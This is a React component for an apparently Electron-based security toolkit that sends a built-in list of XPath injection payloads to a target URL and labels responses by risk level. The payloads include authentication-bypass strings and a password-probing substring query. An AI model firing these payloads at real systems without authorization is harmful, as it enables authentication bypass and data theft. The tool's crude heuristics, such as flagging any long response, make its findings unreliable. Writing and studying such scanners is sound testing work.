import React, { useState } from 'react';
import ToolWrapper from './ToolWrapper';
import styles from './SharedTool.module.css';
import { ShieldIcon, LoadingIcon } from '../common/Icons';

interface XPathResult {
  payload: string;
  statusCode: number;
  responseTime: number;
  vulnerable: boolean;
  risk: 'Low' | 'Medium' | 'High' | 'Critical';
  evidence?: string;
}

const XPathInjectionTester: React.FC = () => {
  const [targetUrl, setTargetUrl] = useState('');
  const [loading, setLoading] = useState(false);
  const [results, setResults] = useState<XPathResult[]>([]);

  const xpathPayloads = [
    "' or '1'='1",
    "' or ''='",
    "x' or 1=1 or 'x'='y",
    "' or 1=1--",
    "' or 1=1#",
    "admin' or '1'='1",
    "' or count(/*)=1 or ''='",
    "' and count(/*)=1 and ''='",
    "1' or '1' = '1",
    "' or substring(//user[1]/password,1,1)='a",
    "' or name()='user' or ''='",
    "' or string-length(//user[1]/password)>0 or ''='",
    "') or ('1'='1",
    "') or 1=1 or ('1'='2",
    "' or '1'='1' --",
  ];

  const testXPath = async () => {
    if (!targetUrl) return;

    setLoading(true);
    setResults([]);

    const testResults: XPathResult[] = [];

    for (const payload of xpathPayloads) {
      try {
        const testUrl = targetUrl.includes('?')
          ? `${targetUrl}&username=${encodeURIComponent(payload)}`
          : `${targetUrl}?username=${encodeURIComponent(payload)}`;

        const startTime = Date.now();
        const response = await window.electronAPI.net.httpFetch(testUrl, {
          method: 'GET',
          timeout: 5000,
        });
        const responseTime = Date.now() - startTime;

        const dataStr = response.data || '';
        const dataLower = dataStr.toLowerCase();

        const vulnerable =
          response.status === 200 &&
          (dataLower.includes('xpath') ||
            dataLower.includes('xml') ||
            dataLower.includes('nodeset') ||
            dataLower.includes('parsing error') ||
            dataLower.includes('syntax error') ||
            dataLower.includes('boolean') ||
            dataLower.includes('<user') ||
            dataLower.includes('<admin') ||
            dataStr.length > 1000);

        let risk: 'Low' | 'Medium' | 'High' | 'Critical' = 'Low';
        let evidence = '';

        if (vulnerable) {
          if (
            dataLower.includes('<password') ||
            dataLower.includes('<admin') ||
            dataLower.includes('administrator')
          ) {
            risk = 'Critical';
            evidence = 'Sensitive data possibly exposed via XPath';
          } else if (
            dataLower.includes('xpath') ||
            dataLower.includes('syntax error') ||
            dataLower.includes('parsing error')
          ) {
            risk = 'High';
            evidence = 'XPath error message revealed';
          } else if (dataLower.includes('xml') || dataLower.includes('<user')) {
            risk = 'High';
            evidence = 'XML data exposed via XPath injection';
          } else {
            risk = 'Medium';
            evidence = 'Potential XPath injection vulnerability';
          }
        }

        testResults.push({
          payload,
          statusCode: response.status || 0,
          responseTime,
          vulnerable,
          risk,
          evidence,
        });
      } catch (error) {
        testResults.push({
          payload,
          statusCode: 0,
          responseTime: 0,
          vulnerable: false,
          risk: 'Low',
          evidence: `Error: ${error instanceof Error ? error.message : 'Unknown'}`,
        });
      }
    }

    setResults(testResults);
    setLoading(false);
  };

  const vulnerableCount = results.filter((r) => r.vulnerable).length;
  const criticalCount = results.filter((r) => r.risk === 'Critical').length;
  const highCount = results.filter((r) => r.risk === 'High').length;

  return (
    <ToolWrapper
      title="XPath Injection Tester"
      icon={<ShieldIcon />}
      description="Test for XPath injection vulnerabilities"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Target URL</label>
          <input
            type="text"
            value={targetUrl}
            onChange={(e) => setTargetUrl(e.target.value)}
            placeholder="https://example.com/search"
            className={styles.input}
          />
        </div>

        <div className={styles.buttonGroup}>
          <button
            onClick={testXPath}
            disabled={loading || !targetUrl}
            className={styles.primaryBtn}
          >
            {loading ? (
              <>
                <LoadingIcon /> Testing XPath Injection...
              </>
            ) : (
              'Start XPath Injection Test'
            )}
          </button>
        </div>
      </div>

      {results.length > 0 && (
        <div className={styles.resultBox}>
          <div className={styles.grid + ' ' + styles.grid3}>
            <div className={styles.statCard}>
              <div className={styles.statLabel}>Payloads Tested</div>
              <div className={styles.statValue}>{results.length}</div>
            </div>
            <div className={styles.statCard}>
              <div className={styles.statLabel}>Vulnerable</div>
              <div className={styles.statValueError}>{vulnerableCount}</div>
            </div>
            <div className={styles.statCard}>
              <div className={styles.statLabel}>Critical/High Risk</div>
              <div className={styles.statValueError}>{criticalCount + highCount}</div>
            </div>
          </div>

          <div className={styles.tableWrapper + ' ' + styles.mt20}>
            <table className={styles.table}>
              <thead>
                <tr>
                  <th>Payload</th>
                  <th>Status</th>
                  <th>Time (ms)</th>
                  <th>Vulnerable</th>
                  <th>Risk</th>
                  <th>Evidence</th>
                </tr>
              </thead>
              <tbody>
                {results.map((result, idx) => (
                  <tr key={idx} className={result.vulnerable ? styles.rowError : ''}>
                    <td className={styles.code}>{result.payload}</td>
                    <td>
                      <span
                        className={
                          result.statusCode === 200
                            ? styles.badgeSuccess
                            : result.statusCode === 0
                              ? styles.badgeNeutral
                              : styles.badgeWarning
                        }
                        style={{ display: 'inline-block' }}
                      >
                        {result.statusCode}
                      </span>
                    </td>
                    <td>{result.responseTime}</td>
                    <td>
                      {result.vulnerable ? (
                        <span className={styles.textError}>YES</span>
                      ) : (
                        <span className={styles.textSuccess}>NO</span>
                      )}
                    </td>
                    <td>
                      <span
                        className={
                          result.risk === 'Critical'
                            ? styles.badgeCritical
                            : result.risk === 'High'
                              ? styles.badgeHigh
                              : result.risk === 'Medium'
                                ? styles.badgeMedium
                                : styles.badgeLow
                        }
                        style={{ display: 'inline-block' }}
                      >
                        {result.risk}
                      </span>
                    </td>
                    <td className={styles.resultContent}>{result.evidence}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}
    </ToolWrapper>
  );
};

export default XPathInjectionTester;
